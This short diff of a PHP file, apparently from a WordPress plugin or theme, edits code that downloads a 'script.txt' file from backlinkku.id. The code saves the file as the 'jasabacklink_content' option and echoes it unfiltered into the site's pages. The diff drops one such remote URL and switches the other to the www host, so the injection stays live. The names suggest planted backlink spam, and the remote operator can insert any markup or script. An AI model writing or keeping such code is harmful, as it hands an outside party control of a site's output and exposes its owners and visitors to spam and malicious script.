@@ -31,7 +31,5 @@ function fetch_and_display_content($url) {
     update_option('jasabacklink_content', $body);
     echo $body;
 }
-$ilmumahal = 'https://backlinkku.id/menu/traffic-v1/script.txt';
-fetch_and_display_content($ilmumahal);
-$jasabacklinks = 'https://backlinkku.id/menu/server-id/script.txt';
+$jasabacklinks = 'https://www.backlinkku.id/menu/server-id/script.txt';
 fetch_and_display_content($jasabacklinks);
